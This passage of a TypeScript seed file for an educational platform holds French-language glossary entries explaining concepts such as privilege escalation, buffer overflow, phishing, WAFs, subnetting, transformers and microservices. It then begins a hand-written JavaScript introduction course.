    explanationAdvanced:
      "Le calcul se base sur plusieurs métriques : vecteur d'attaque (réseau, local, physique), complexité d'exploitation, privilèges requis, interaction utilisateur nécessaire, et impact sur confidentialité/intégrité/disponibilité (la CIA Triad). Un score élevé combiné à une exploitation triviale à distance sans authentification représente typiquement le niveau de priorité de correction le plus urgent.",
    docUrl: "https://www.first.org/cvss/",
    relatedKeys: ["cve", "cia-triad"],
    prerequisiteKeys: ["cve"],
    aliases: ["common vulnerability scoring system"],
  },
  {
    key: "privilege-escalation",
    name: "Privilege Escalation",
    category: "CYBERSECURITY",
    level: 3,
    definition:
      "Une technique par laquelle un attaquant, déjà présent sur un système avec des accès limités, obtient des privilèges plus élevés que ceux initialement accordés.",
    explanationBeginner:
      "Un attaquant qui a réussi à accéder à un compte utilisateur normal cherche ensuite à devenir administrateur/root — c'est l'élévation de privilèges. C'est presque toujours la deuxième étape d'une attaque, après l'accès initial.",
    explanationAdvanced:
      "On distingue l'élévation verticale (obtenir un niveau de privilège supérieur, ex: user → root) de l'élévation horizontale (accéder aux ressources d'un autre utilisateur de même niveau). Les vecteurs classiques incluent des permissions de fichiers mal configurées, des services tournant avec des privilèges excessifs, ou des vulnérabilités logicielles non corrigées — le principe du moindre privilège est la contre-mesure structurelle principale.",
    docUrl: "https://owasp.org/www-community/attacks/Privilege_escalation",
    relatedKeys: ["least-privilege-principle", "attack-surface"],
    prerequisiteKeys: [],
    aliases: ["elevation de privileges"],
  },
  {
    key: "buffer-overflow",
    name: "Buffer Overflow",
    category: "CYBERSECURITY",
    level: 4,
    definition:
      "Une vulnérabilité où un programme écrit plus de données dans une zone mémoire (buffer) que sa capacité allouée, débordant sur la mémoire adjacente — historiquement l'une des failles les plus exploitées.",
    explanationBeginner:
      "Imagine une boîte prévue pour 10 objets dans laquelle on en force 15 : les 5 en trop débordent sur l'espace voisin. En mémoire, ce débordement peut écraser des données importantes (ou même du code exécutable), qu'un attaquant peut exploiter pour détourner l'exécution du programme.",
    explanationAdvanced:
      "Historiquement fréquent en C/C++ (langages à gestion manuelle de la mémoire, sans vérification automatique des bornes d'un tableau). Un buffer overflow bien exploité peut permettre l'exécution de code arbitraire en écrasant l'adresse de retour d'une fonction sur la pile. Les langages modernes avec gestion mémoire automatique (JavaScript, Python, Rust) éliminent cette classe de vulnérabilité par construction — Rust va plus loin en garantissant la sécurité mémoire sans garbage collector, via son système d'ownership.",
    docUrl: "https://owasp.org/www-community/vulnerabilities/Buffer_Overflow",
    relatedKeys: ["rust"],
    prerequisiteKeys: [],
    aliases: ["debordement de tampon"],
  },
  {
    key: "phishing",
    name: "Phishing",
    category: "CYBERSECURITY",
    level: 1,
    definition:
      "Une technique d'ingénierie sociale où un attaquant se fait passer pour une entité légitime (banque, service RH, collègue) pour tromper une victime et lui faire révéler des informations sensibles ou cliquer sur un lien malveillant.",
    explanationBeginner:
      "Un email « urgent » prétendant venir de ta banque, te demandant de cliquer sur un lien pour « vérifier ton compte » avant qu'il ne soit bloqué, est un exemple classique de phishing — l'objectif est de créer de l'urgence pour court-circuiter la réflexion.",
    explanationAdvanced:
      "Le spear phishing cible une personne précise avec des informations personnalisées (récoltées via OSINT) pour paraître plus crédible ; le whaling cible spécifiquement des cadres dirigeants. Les indicateurs techniques classiques incluent un domaine d'expéditeur légèrement différent de l'officiel (typosquatting), des liens dont l'URL réelle diffère du texte affiché, et une pression temporelle artificielle — mais aucune formation ne rend une organisation totalement immunisée, d'où l'importance de contrôles techniques complémentaires (MFA, filtrage anti-spam).",
    docUrl: "https://www.cisa.gov/topics/cyber-threats-and-advisories/phishing",
    relatedKeys: ["social-engineering", "mfa"],
    prerequisiteKeys: [],
    aliases: ["hameconnage"],
  },
  {
    key: "rbac",
    name: "RBAC",
    category: "CYBERSECURITY",
    level: 2,
    definition:
      "Role-Based Access Control — un modèle de contrôle d'accès où les permissions sont attribuées à des rôles (ex: « admin », « éditeur », « lecteur »), et les utilisateurs héritent des permissions du rôle qui leur est assigné.",
    explanationBeginner:
      "Plutôt que de configurer les permissions individuellement pour chaque utilisateur, on définit des rôles avec un ensemble de permissions cohérent, puis on assigne chaque utilisateur à un ou plusieurs rôles — beaucoup plus simple à gérer et à auditer à grande échelle.",
    explanationAdvanced:
      "RBAC s'oppose à l'ABAC (Attribute-Based Access Control), plus flexible car basé sur des attributs contextuels (heure, localisation, département) plutôt que sur des rôles fixes, mais plus complexe à raisonner et auditer. RBAC reste le modèle par défaut recommandé pour la majorité des cas grâce à sa simplicité — il s'aligne naturellement avec le principe du moindre privilège quand les rôles sont bien découpés.",
    docUrl: "https://en.wikipedia.org/wiki/Role-based_access_control",
    relatedKeys: ["least-privilege-principle"],
    prerequisiteKeys: [],
    aliases: ["role based access control", "controle d'acces base sur les roles"],
  },
  {
    key: "hashing",
    name: "Hashing",
    category: "CYBERSECURITY",
    level: 2,
    definition:
      "Une fonction mathématique à sens unique qui transforme une donnée de taille arbitraire en une empreinte de taille fixe — utilisée pour stocker des mots de passe sans jamais les garder en clair.",
    explanationBeginner:
      "Un bon algorithme de hash produit toujours la même empreinte pour la même entrée, mais il est pratiquement impossible de retrouver l'entrée d'origine à partir de l'empreinte seule — c'est pourquoi on stocke le hash d'un mot de passe, jamais le mot de passe lui-même.",
    explanationAdvanced:
      "Le hashing diffère du chiffrement (réversible avec la bonne clé) : un hash n'est jamais censé être « dé-hashé ». Pour les mots de passe spécifiquement, des algorithmes lents et adaptatifs (bcrypt, Argon2, scrypt) sont préférés à des hash rapides génériques (SHA-256, MD5) précisément parce que leur lenteur intentionnelle ralentit une attaque par force brute — un hash rapide facilite au contraire les attaques massives. Le salage (salting) empêche l'utilisation de tables précalculées (rainbow tables).",
    docUrl: "https://owasp.org/www-community/Password_Storage_Cheat_Sheet",
    relatedKeys: ["salting-purpose", "brute-force-attack"],
    prerequisiteKeys: [],
    aliases: ["hachage"],
  },
  {
    key: "waf",
    name: "WAF",
    category: "CYBERSECURITY",
    level: 3,
    definition:
      "Web Application Firewall — un pare-feu spécialisé placé devant une application web, qui filtre le trafic HTTP en analysant le contenu des requêtes (pas seulement les ports/IP comme un pare-feu réseau classique) pour bloquer des attaques connues.",
    explanationBeginner:
      "Un WAF inspecte le contenu réel des requêtes web (paramètres, en-têtes, corps) pour détecter des tentatives d'injection SQL, de XSS ou d'autres patterns d'attaque connus, et les bloquer avant qu'elles n'atteignent l'application — une couche de protection supplémentaire, pas un remplacement d'un code sécurisé.",
    explanationAdvanced:
      "Un WAF fonctionne généralement sur un modèle de règles (signatures d'attaques connues) ou un modèle comportemental (détection d'anomalies par rapport à un trafic habituel) — parfois les deux combinés. Un WAF n'est pas une solution miracle : il complète, sans jamais remplacer, une application déjà codée de façon sécurisée (requêtes paramétrées, échappement systématique) — un WAF seul peut être contourné par des variantes d'attaque non couvertes par ses règles.",
    docUrl: "https://owasp.org/www-community/Web_Application_Firewall",
    relatedKeys: ["sql-injection", "xss"],
    prerequisiteKeys: [],
    aliases: ["web application firewall", "pare-feu applicatif"],
  },
  {
    key: "osi-model",
    name: "Modèle OSI",
    category: "NETWORKING",
    level: 2,
    definition:
      "Open Systems Interconnection — un modèle conceptuel à 7 couches qui décrit comment les données circulent d'une application à travers le réseau jusqu'à une autre application, chaque couche ayant une responsabilité précise.",
    explanationBeginner:
      "De haut en bas : Application (le logiciel), Présentation (format des données), Session (gestion de la connexion), Transport (TCP/UDP), Réseau (IP, routage), Liaison (adressage MAC local), Physique (câbles, signaux). Chaque couche ne se préoccupe que de son propre rôle, sans savoir comment les autres fonctionnent.",
    explanationAdvanced:
      "Le modèle OSI est surtout pédagogique aujourd'hui — l'implémentation réelle d'internet suit plutôt le modèle TCP/IP à 4 couches, plus simple. Comprendre à quelle couche appartient un protocole aide à diagnostiquer un problème réseau : un problème DNS est applicatif (couche 7), un câble débranché est physique (couche 1), un souci de routage est réseau (couche 3) — savoir où chercher accélère énormément le diagnostic.",
    docUrl: "https://www.cloudflare.com/learning/ddos/glossary/open-systems-interconnection-model-osi/",
    relatedKeys: ["tcp-vs-udp", "http"],
    prerequisiteKeys: [],
    aliases: ["osi", "modele osi 7 couches"],
  },
  {
    key: "subnetting",
    name: "Subnetting",
    category: "NETWORKING",
    level: 3,
    definition:
      "La technique qui divise un réseau IP en sous-réseaux (subnets) plus petits, pour organiser le trafic, isoler des groupes de machines et utiliser plus efficacement l'espace d'adresses disponible.",
    explanationBeginner:
      "Plutôt qu'un seul énorme réseau plat où toutes les machines se voient directement, on le découpe en sous-réseaux plus petits (par service, par étage, par département) — ça limite la portée d'un incident et facilite la gestion du trafic.",
    explanationAdvanced:
      "Le masque de sous-réseau (ex: `/24` = 255.255.255.0) détermine combien de bits de l'adresse IP identifient le réseau vs l'hôte — plus le préfixe est grand (`/28` par exemple), plus le sous-réseau est petit en nombre d'adresses disponibles. Le CIDR (Classless Inter-Domain Routing) a remplacé l'ancien système de classes fixes (A/B/C) pour permettre un découpage bien plus flexible et économe en adresses.",
    docUrl: "https://www.cloudflare.com/learning/network-layer/what-is-a-subnet/",
    relatedKeys: ["ip-private-range", "nat"],
    prerequisiteKeys: [],
    aliases: ["sous-reseau", "cidr"],
  },
  {
    key: "nat",
    name: "NAT",
    category: "NETWORKING",
    level: 2,
    definition:
      "Network Address Translation — la technique qui permet à plusieurs machines d'un réseau privé de partager une seule adresse IP publique pour communiquer sur internet.",
    explanationBeginner:
      "Ta box internet a une seule adresse IP publique, mais tous tes appareils (téléphone, ordinateur, TV connectée) ont chacun une adresse privée différente sur ton réseau local — le NAT traduit et route le trafic entre ces adresses privées et l'unique adresse publique partagée.",
    explanationAdvanced:
      "Le NAT à état (stateful) garde une table de correspondance entre les connexions sortantes (IP privée + port) et l'IP/port publics utilisés, pour router correctement les réponses entrantes vers la bonne machine interne. C'est aussi, incidemment, une forme légère de sécurité par obscurité : les machines internes ne sont pas directement adressables depuis l'extérieur sans configuration explicite (port forwarding).",
    docUrl: "https://www.cloudflare.com/learning/network-layer/what-is-nat/",
    relatedKeys: ["ip-private-range", "subnetting"],
    prerequisiteKeys: [],
    aliases: ["network address translation", "traduction d'adresse reseau"],
  },
  {
    key: "firewall",
    name: "Pare-feu (Firewall)",
    category: "NETWORKING",
    level: 1,
    definition:
      "Un système qui filtre le trafic réseau entrant/sortant selon un ensemble de règles prédéfinies, pour bloquer les communications non autorisées.",
    explanationBeginner:
      "Un pare-feu agit comme un videur à l'entrée d'un club : il vérifie chaque paquet réseau selon une liste de règles (« ce port est autorisé », « cette IP est bloquée ») et décide de le laisser passer ou de le rejeter.",
    explanationAdvanced:
      "Un pare-feu réseau classique filtre sur les en-têtes (IP source/destination, port, protocole) sans regarder le contenu applicatif — c'est le rôle d'un WAF pour le trafic web spécifiquement. Les pare-feux stateful gardent en mémoire l'état des connexions établies pour n'autoriser que les réponses légitimes à une connexion sortante déjà initiée, contrairement aux pare-feux stateless plus anciens qui évaluent chaque paquet isolément.",
    docUrl: "https://www.cloudflare.com/learning/security/what-is-a-firewall/",
    relatedKeys: ["waf", "vpn"],
    prerequisiteKeys: [],
    aliases: ["pare feu"],
  },
  {
    key: "machine-learning",
    name: "Machine Learning",
    category: "AI",
    level: 1,
    definition:
      "Une branche de l'intelligence artificielle où un système apprend à reconnaître des patterns à partir de données, plutôt que d'être programmé avec des règles explicites pour chaque cas.",
    explanationBeginner:
      "Au lieu d'écrire des règles « si X alors Y » pour chaque situation, on montre au système des milliers d'exemples (données d'entraînement) et il apprend lui-même à généraliser un pattern — comme reconnaître un chat sur une photo sans qu'on ait défini manuellement « ce qu'est » visuellement un chat.",
    explanationAdvanced:
      "On distingue l'apprentissage supervisé (données étiquetées avec la bonne réponse attendue), non supervisé (le modèle trouve seul des structures/clusters sans étiquette) et par renforcement (le modèle apprend par essai-erreur via un système de récompense). Le deep learning est un sous-domaine du ML basé sur des réseaux de neurones à plusieurs couches, à l'origine des progrès récents en vision par ordinateur et en traitement du langage (dont les LLM).",
    docUrl: "https://www.ibm.com/topics/machine-learning",
    relatedKeys: ["llm", "supervised-learning-def"],
    prerequisiteKeys: [],
    aliases: ["apprentissage automatique", "ml"],
  },
  {
    key: "vector-database",
    name: "Base de données vectorielle",
    category: "AI",
    level: 3,
    definition:
      "Une base de données optimisée pour stocker et rechercher des embeddings (représentations vectorielles) par similarité, plutôt que par correspondance exacte comme une base SQL classique.",
    explanationBeginner:
      "Une base classique retrouve une ligne par correspondance exacte (« WHERE id = 5 »). Une base vectorielle retrouve plutôt les éléments les plus « proches » sémantiquement d'une requête donnée — utile pour du RAG, où on cherche les extraits de documentation les plus pertinents pour une question, même sans mot-clé exact en commun.",
    explanationAdvanced:
      "La recherche par similarité (souvent cosine similarity ou distance euclidienne) sur de très grands volumes de vecteurs utilise des index approximatifs (ANN — Approximate Nearest Neighbor, ex: HNSW) plutôt qu'une comparaison exhaustive, pour rester performante à grande échelle. Nodify utilise volontairement une recherche par mots-clés plus simple pour son système documentaire (voir docsService.ts), faute d'API d'embeddings publique exposée par le provider utilisé.",
    docUrl: "https://www.pinecone.io/learn/vector-database/",
    relatedKeys: ["rag", "embedding-def"],
    prerequisiteKeys: ["machine-learning"],
    aliases: ["vector db", "base vectorielle"],
  },
  {
    key: "transformer-architecture",
    name: "Architecture Transformer",
    category: "AI",
    level: 4,
    definition:
      "L'architecture de réseau de neurones (introduite en 2017) sur laquelle reposent la quasi-totalité des grands modèles de langage modernes (GPT, Claude, Gemini...), basée sur un mécanisme d'attention.",
    explanationBeginner:
      "Le Transformer permet à un modèle de « prêter attention » à différentes parties d'un texte simultanément pour comprendre le contexte d'un mot — contrairement aux architectures précédentes qui traitaient le texte séquentiellement, mot après mot, perdant plus facilement le contexte sur de longs textes.",
    explanationAdvanced:
      "Le mécanisme central est le « self-attention » : pour chaque mot (token), le modèle calcule un poids d'importance par rapport à tous les autres tokens du contexte, permettant de capturer des dépendances à longue distance efficacement, et en parallèle (contrairement aux RNN/LSTM séquentiels qui l'ont précédé). Ce parallélisme est aussi ce qui a rendu l'entraînement sur d'énormes volumes de données pratiquement réalisable.",
    docUrl: "https://en.wikipedia.org/wiki/Transformer_(deep_learning_architecture)",
    relatedKeys: ["llm", "tokenization"],
    prerequisiteKeys: ["machine-learning"],
    aliases: ["transformer", "self-attention"],
  },
  {
    key: "infrastructure-as-code",
    name: "Infrastructure as Code",
    category: "CLOUD",
    level: 2,
    definition:
      "La pratique de définir et gérer son infrastructure (serveurs, réseaux, bases de données) via des fichiers de configuration versionnés, plutôt qu'en cliquant manuellement dans une interface web.",
    explanationBeginner:
      "Au lieu de créer un serveur en cliquant dans une console cloud (étapes non reproductibles, non tracées), on décrit cette infrastructure dans un fichier texte versionné dans Git — reproductible, review-able comme du code, et facilement recréable à l'identique sur un autre environnement.",
    explanationAdvanced:
      "Terraform est l'outil le plus connu, avec une approche déclarative : on décrit l'état final voulu, l'outil calcule le diff avec l'état actuel et applique uniquement les changements nécessaires. L'IaC élimine la « configuration drift » (dérive de configuration) — le décalage progressif entre ce qui est documenté et ce qui tourne réellement en production, un problème classique de la gestion manuelle d'infrastructure.",
    docUrl: "https://www.terraform.io/intro",
    relatedKeys: ["terraform", "ci-cd"],
    prerequisiteKeys: [],
    aliases: ["iac"],
  },
  {
    key: "auto-scaling",
    name: "Auto-scaling",
    category: "CLOUD",
    level: 3,
    definition:
      "La capacité d'une infrastructure cloud à ajouter ou retirer automatiquement des ressources (serveurs, instances) en fonction de la charge réelle, sans intervention manuelle.",
    explanationBeginner:
      "Si le trafic d'un site explose soudainement (pic viral, soldes), l'auto-scaling déclenche automatiquement le démarrage de nouveaux serveurs pour absorber la charge — puis les retire automatiquement quand le trafic redescend, évitant de payer pour une capacité inutilisée en temps normal.",
    explanationAdvanced:
      "Le scaling horizontal (ajouter des instances) est généralement préféré au scaling vertical (augmenter la puissance d'une seule instance) en cloud, car il n'a pas de limite physique dure et permet une meilleure tolérance aux pannes (répartition sur plusieurs machines). Les règles d'auto-scaling se basent typiquement sur des métriques (CPU, mémoire, nombre de requêtes) avec des seuils de déclenchement — un mauvais réglage peut créer un effet de yo-yo (scaling up/down en boucle) s'il est trop réactif.",
    docUrl: "https://aws.amazon.com/autoscaling/",
    relatedKeys: ["load-balancer", "serverless"],
    prerequisiteKeys: [],
    aliases: ["mise a l'echelle automatique"],
  },
  {
    key: "object-storage",
    name: "Object Storage",
    category: "CLOUD",
    level: 2,
    definition:
      "Un service de stockage cloud (ex: AWS S3) qui stocke des fichiers comme des objets indépendants accessibles par une clé unique, plutôt que dans une hiérarchie de dossiers classique comme un système de fichiers traditionnel.",
    explanationBeginner:
      "Au lieu de stocker un fichier sur le disque d'un serveur précis (qui peut tomber en panne), l'object storage le distribue et le réplique automatiquement sur plusieurs machines/zones — le fichier reste accessible même si une partie de l'infrastructure tombe en panne, avec une durabilité bien supérieure à un disque classique.",
    explanationAdvanced:
      "Chaque objet est accompagné de métadonnées personnalisables et accessible via une simple URL/API HTTP, sans notion réelle de hiérarchie de dossiers (les « dossiers » affichés dans une interface S3 sont une simulation via des préfixes dans le nom de clé). Idéal pour du contenu statique à fort volume (images, backups, logs) mais pas adapté à des accès aléatoires fréquents avec verrouillage/écriture concurrente comme un vrai système de fichiers.",
    docUrl: "https://aws.amazon.com/s3/",
    relatedKeys: ["cdn"],
    prerequisiteKeys: [],
    aliases: ["stockage objet", "s3"],
  },
  {
    key: "cpu-cache",
    name: "Cache CPU",
    category: "SYSTEMS",
    level: 3,
    definition:
      "Une mémoire très rapide mais de petite taille, intégrée au processeur, qui garde une copie des données/instructions les plus récemment ou fréquemment utilisées pour éviter des accès plus lents à la RAM.",
    explanationBeginner:
      "Accéder à la RAM prend un temps significatif à l'échelle d'un processeur moderne — le cache CPU (organisé en niveaux L1/L2/L3, du plus petit/rapide au plus grand/lent) garde sous la main les données probablement réutilisées bientôt, accélérant énormément les traitements répétitifs.",
    explanationAdvanced:
      "Le principe de localité (temporelle : une donnée récemment utilisée le sera probablement encore bientôt ; spatiale : une donnée proche en mémoire d'une donnée utilisée le sera probablement aussi) guide les stratégies de préchargement du cache. Un « cache miss » (donnée absente du cache, nécessitant un accès RAM plus lent) impacte directement les performances — c'est une des raisons pour lesquelles l'ordre d'accès aux structures de données en mémoire (parcourir un tableau séquentiellement vs de façon éparpillée) peut avoir un impact mesurable sur la vitesse d'exécution.",
    docUrl: "https://en.wikipedia.org/wiki/CPU_cache",
    relatedKeys: ["ram-vs-disk-storage"],
    prerequisiteKeys: [],
    aliases: ["cache processeur"],
  },
  {
    key: "virtual-memory",
    name: "Mémoire virtuelle",
    category: "SYSTEMS",
    level: 3,
    definition:
      "Une technique du système d'exploitation qui donne à chaque programme l'illusion de disposer d'un espace mémoire continu et privé, indépendamment de la RAM physique réellement disponible.",
    explanationBeginner:
      "Chaque programme croit avoir accès à toute la mémoire de la machine pour lui seul — le système d'exploitation traduit en réalité cette « mémoire virtuelle » vers la RAM physique (partagée entre tous les programmes en cours), de façon totalement transparente pour le programme.",
    explanationAdvanced:
      "Quand la RAM physique disponible est insuffisante, le système peut déplacer temporairement des pages mémoire peu utilisées vers le disque (le swap) pour libérer de la RAM — beaucoup plus lent qu'un accès RAM direct, d'où le ralentissement perceptible d'une machine qui swappe intensément. La pagination (division en pages de taille fixe) est le mécanisme technique standard qui rend cette traduction virtuel→physique gérable, avec la MMU (Memory Management Unit) matérielle qui accélère cette traduction.",
    docUrl: "https://en.wikipedia.org/wiki/Virtual_memory",
    relatedKeys: ["swap-memory-purpose", "ram-vs-disk-storage"],
    prerequisiteKeys: [],
    aliases: ["memoire virtuelle"],
  },
  {
    key: "boot-process",
    name: "Processus de démarrage (Boot)",
    category: "SYSTEMS",
    level: 2,
    definition:
      "La séquence d'étapes qu'exécute un ordinateur entre sa mise sous tension et le chargement complet du système d'exploitation, prêt à l'utilisation.",
    explanationBeginner:
      "À l'allumage : le BIOS/UEFI (firmware intégré à la carte mère) se lance en premier, effectue des vérifications matérielles de base, puis localise et lance le chargeur de démarrage (bootloader), qui charge à son tour le noyau du système d'exploitation en mémoire.",
    explanationAdvanced:
      "UEFI a largement remplacé le BIOS historique sur le matériel récent, avec des avantages notables : support de disques plus grands (GPT plutôt que MBR), démarrage plus rapide, et Secure Boot — une vérification cryptographique de la signature du bootloader et du noyau avant de les exécuter, pour empêcher le chargement d'un composant de démarrage malveillant compromis.",
    docUrl: "https://en.wikipedia.org/wiki/Booting",
    relatedKeys: ["bios-uefi-role", "os-kernel-def"],
    prerequisiteKeys: [],
    aliases: ["demarrage", "boot"],
  },
  {
    key: "containerization",
    name: "Conteneurisation",
    category: "SYSTEMS",
    level: 2,
    definition:
      "Une technique d'isolation légère qui empaquette une application avec toutes ses dépendances dans un environnement portable (conteneur), en partageant le noyau du système hôte — contrairement à une machine virtuelle qui virtualise du matériel entier.",
    explanationBeginner:
      "Un conteneur (comme ceux créés par Docker) démarre en une fraction de seconde et consomme peu de ressources, car il ne réinvente pas un système d'exploitation complet comme le fait une machine virtuelle — il réutilise le noyau de la machine hôte tout en isolant les processus, fichiers et ressources réseau de l'application.",
    explanationAdvanced:
      "L'isolation d'un conteneur repose sur des fonctionnalités du noyau Linux : les namespaces (isolation de la vue — processus, réseau, système de fichiers — propre à chaque conteneur) et les cgroups (limitation des ressources CPU/mémoire allouées). Une machine virtuelle virtualise du matériel complet via un hyperviseur et fait tourner un noyau OS complet et séparé par VM — plus lourd, mais avec une isolation plus forte (utile quand on ne fait pas confiance du tout au code exécuté).",
    docUrl: "https://www.docker.com/resources/what-container/",
    relatedKeys: ["docker", "kubernetes"],
    prerequisiteKeys: [],
    aliases: ["containerisation", "conteneurs"],
  },
  {
    key: "design-patterns",
    name: "Design Patterns",
    category: "DEVELOPMENT",
    level: 3,
    definition:
      "Des solutions réutilisables et éprouvées à des problèmes de conception logicielle récurrents, formalisées avec un nom et un vocabulaire commun entre développeurs.",
    explanationBeginner:
      "Plutôt que de réinventer une solution à un problème déjà rencontré des milliers de fois par d'autres développeurs (« comment créer un seul objet partagé partout ? », « comment notifier plusieurs composants d'un changement ? »), les design patterns offrent un vocabulaire et une solution éprouvée — communiquer « on utilise un Observer ici » est bien plus rapide que de réexpliquer toute la structure.",
    explanationAdvanced:
      "Le livre fondateur (le « Gang of Four », 1994) classe les patterns en trois familles : créationnels (Factory, Singleton — comment créer des objets), structurels (Adapter, Decorator — comment composer des objets/classes), comportementaux (Observer, Strategy — comment les objets interagissent). Un piège fréquent chez les développeurs juniors est de forcer un pattern là où une solution simple suffirait — un pattern doit résoudre un vrai problème de conception, pas être appliqué par principe.",
    docUrl: "https://refactoring.guru/design-patterns",
    relatedKeys: ["clean-code"],
    prerequisiteKeys: [],
    aliases: ["patrons de conception"],
  },
  {
    key: "clean-code",
    name: "Clean Code",
    category: "DEVELOPMENT",
    level: 2,
    definition:
      "Un ensemble de principes visant à écrire du code lisible, compréhensible et maintenable par d'autres développeurs (ou soi-même dans 6 mois), pas seulement du code qui « fonctionne ».",
    explanationBeginner:
      "Un nom de variable explicite (`totalPrice` plutôt que `x`), une fonction qui ne fait qu'une seule chose clairement identifiable, des commentaires qui expliquent le « pourquoi » plutôt que de répéter le « quoi » évident du code — autant de pratiques simples qui rendent un code bien plus facile à reprendre plus tard.",
    explanationAdvanced:
      "Le principe DRY (Don't Repeat Yourself) évite la duplication de logique — mais peut être appliqué à l'excès, créant une abstraction prématurée pour une similarité superficielle entre deux bouts de code qui, en réalité, évolueront différemment. Le ratio « temps passé à lire du code existant » vs « temps passé à en écrire » est largement en faveur de la lecture dans un projet réel — d'où l'importance disproportionnée de la lisibilité par rapport à la rapidité d'écriture initiale.",
    docUrl: "https://github.com/ryanmcdermott/clean-code-javascript",
    relatedKeys: ["design-patterns", "technical-debt"],
    prerequisiteKeys: [],
    aliases: ["code propre"],
  },
  {
    key: "technical-debt",
    name: "Dette technique",
    category: "DEVELOPMENT",
    level: 2,
    definition:
      "Le coût futur implicite d'un raccourci pris aujourd'hui (code rapide mais mal structuré, absence de tests, documentation manquante) — comme une dette financière, elle génère des « intérêts » qui rendent le code de plus en plus coûteux à faire évoluer si elle n'est jamais remboursée.",
    explanationBeginner:
      "Livrer vite en prenant un raccourci n'est pas toujours une erreur — parfois c'est un choix pragmatique justifié. Le problème survient quand cette dette s'accumule sans jamais être « remboursée » (refactorée) : chaque nouvelle fonctionnalité devient plus lente et risquée à ajouter sur une base de code de plus en plus fragile.",
    explanationAdvanced:
      "Toute dette technique n'est pas volontaire — elle peut venir d'un manque de connaissance au moment de l'écriture, ou d'exigences qui ont changé depuis. La distinction utile est entre dette délibérée et consciente (compromis assumé pour tenir un délai, avec un plan de remboursement) et dette accidentelle (résultant d'un manque de rigueur) — la première est un outil de gestion de projet légitime, la seconde un signal d'alerte sur le process de développement.",
    docUrl: "https://martinfowler.com/bliki/TechnicalDebt.html",
    relatedKeys: ["clean-code"],
    prerequisiteKeys: [],
    aliases: ["dette technique"],
  },
  {
    key: "rate-limiting",
    name: "Rate Limiting",
    category: "DEVELOPMENT",
    level: 2,
    definition:
      "Une technique qui limite le nombre de requêtes qu'un client peut effectuer sur une API dans une fenêtre de temps donnée, pour protéger le service contre les abus et la surcharge.",
    explanationBeginner:
      "Sans limite, un client (volontairement malveillant ou juste buggé) pourrait envoyer des milliers de requêtes par seconde et saturer le serveur pour tous les autres utilisateurs — le rate limiting impose un plafond (ex: « 100 requêtes par minute par utilisateur ») et rejette les requêtes en excès avec un code `429 Too Many Requests`.",
    explanationAdvanced:
      "Plusieurs algorithmes existent : token bucket (un « seau » de jetons se remplit à débit constant, chaque requête consomme un jeton, autorisant des pics courts tant que le seau n'est pas vide), sliding window (compte les requêtes sur une fenêtre glissante plus précise qu'une fenêtre fixe qui peut être contournée à la frontière de deux fenêtres). Le rate limiting est aussi une défense de base contre le brute force (limiter les tentatives de connexion) et certaines formes de DDoS applicatif.",
    docUrl: "https://cloud.google.com/architecture/rate-limiting-strategies-techniques",
    relatedKeys: ["ddos", "brute-force-attack"],
    prerequisiteKeys: [],
    aliases: ["limitation de debit"],
  },
  {
    key: "message-queue",
    name: "Message Queue",
    category: "DEVELOPMENT",
    level: 3,
    definition:
      "Un système intermédiaire qui permet à un service (producteur) d'envoyer des messages/tâches à traiter plus tard par un autre service (consommateur), sans que les deux aient besoin d'être disponibles au même moment.",
    explanationBeginner:
      "Plutôt que de traiter une tâche lente (envoyer un email, générer un rapport) directement pendant qu'un utilisateur attend une réponse, on la place dans une file d'attente — un processus séparé la traite en arrière-plan, et l'utilisateur reçoit une réponse immédiate sans attendre que la tâche lente se termine.",
    explanationAdvanced:
      "Ce découplage améliore la résilience : si le service consommateur tombe temporairement en panne, les messages restent en file d'attente et sont traités dès son retour, plutôt que d'être perdus. Des outils comme RabbitMQ ou Kafka implémentent ce pattern à grande échelle — Kafka en particulier est optimisé pour un débit très élevé de flux d'événements continus (event streaming), pas seulement une simple file de tâches ponctuelles.",
    docUrl: "https://aws.amazon.com/message-queue/",
    relatedKeys: ["microservices", "event-driven-architecture"],
    prerequisiteKeys: [],
    aliases: ["file de messages", "queue"],
  },
  {
    key: "microservices",
    name: "Microservices",
    category: "DEVELOPMENT",
    level: 4,
    definition:
      "Un style d'architecture où une application est découpée en plusieurs services indépendants et déployables séparément, chacun responsable d'une fonctionnalité métier précise, communiquant entre eux via le réseau (API, message queue).",
    explanationBeginner:
      "Au lieu d'une seule grosse application (« monolithe ») qui gère tout, on découpe en petits services indépendants (ex: service de paiement, service d'authentification, service de notifications) — chacun peut être développé, déployé et mis à l'échelle séparément par des équipes différentes.",
    explanationAdvanced:
      "Ce découplage a un coût réel : la complexité opérationnelle augmente fortement (gestion de multiples déploiements, communication réseau entre services qui peut échouer là où un appel de fonction locale ne le pouvait pas, cohérence des données réparties entre plusieurs bases). Un monolithe bien structuré (avec des modules internes clairement séparés) reste souvent le meilleur choix par défaut pour une équipe petite ou un produit encore jeune — les microservices résolvent des problèmes d'échelle organisationnelle et technique qui n'existent pas encore à ce stade.",
    docUrl: "https://martinfowler.com/articles/microservices.html",
    relatedKeys: ["message-queue", "load-balancer"],
    prerequisiteKeys: [],
    aliases: [],
  },
];

/**
 * Premier cours complet de l'Academy (Phase 5), rédigé à la main — pas de
 * contenu généré par IA. Un seul cours pour valider le moteur (Course →
 * Lesson → Question → progression) contre du vrai contenu avant d'en
 * écrire d'autres.
 */
interface QuestionSeed {
  order: number;
  prompt: string;
  choices: string[];
  correctIndex: number;
  explanation: string;
}

interface LessonSeed {
  order: number;
  title: string;
  content: string;
  xpReward: number;
  questions: QuestionSeed[];
}

interface CourseSeed {
  key: string;
  title: string;
  description: string;
  category: SkillCategory;
  skillKey: string; // doit correspondre à un Skill.key existant (voir SKILLS)
  level: number;
  prerequisiteCourseKeys?: string[]; // clés d'autres CourseSeed.key
  lessons: LessonSeed[];
}

const COURSES: CourseSeed[] = [
  {
    key: "js-intro",
    title: "Introduction à JavaScript",
    description:
      "Les bases du langage le plus utilisé du web : variables, fonctions, boucles et conditions.",
    category: "DEVELOPMENT",
    skillKey: "javascript",
    level: 1,
    lessons: [
      {
        order: 1,
        title: "Qu'est-ce que JavaScript ?",
        content:
          "JavaScript est un langage de programmation créé en 1995, exécuté à l'origine dans les navigateurs pour rendre les pages web interactives. Depuis Node.js (2009), il tourne aussi côté serveur.\n\n" +
          "On déclare une variable avec `let` (valeur qui peut changer) ou `const` (valeur qui ne peut plus être réassignée après sa déclaration) — `var` existe encore mais est déconseillé en code moderne à cause de son comportement de portée moins prévisible.\n\n" +
          "Les types primitifs de base sont : `string` (texte), `number` (nombres, entiers et décimaux confondus), `boolean` (`true`/`false`), `undefined` (valeur absente) et `null` (absence volontaire de valeur).",
        xpReward: 20,
        questions: [
